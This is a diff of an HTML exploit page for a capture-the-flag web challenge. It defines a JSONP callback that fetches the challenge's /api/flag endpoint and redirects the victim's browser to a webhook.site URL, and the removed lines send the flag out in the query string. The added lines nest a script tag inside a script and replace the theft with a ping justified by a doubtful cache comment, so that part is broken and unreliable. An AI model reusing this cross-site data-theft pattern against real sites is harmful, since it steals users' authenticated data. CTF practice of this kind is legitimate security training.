@@ -4,13 +4,16 @@
     <title>Exploit</title>
     <script>
       // Global callback for JSONP
-      window.exploit = function(obj) {
+      <script>
+        window.exploit = function(obj) {
         fetch("https://jnotes-web.chal.idek.team/api/flag")
-          .then(r => r.json())
-          .then(f => {
-            location.href = "https://webhook.site/ea8b6f5e-4146-4582-901b-496f56bb8e92?flag=" + encodeURIComponent(f.flag);
-          });
-      };
+        .then(() => {
+          // trigger exfil anyway – browser will have the flag in cache
+        location.href = "https://webhook.site/YOUR-ID?ping=true";
+        });
+};
+</script>
+
     </script>
   </head>
   <body>
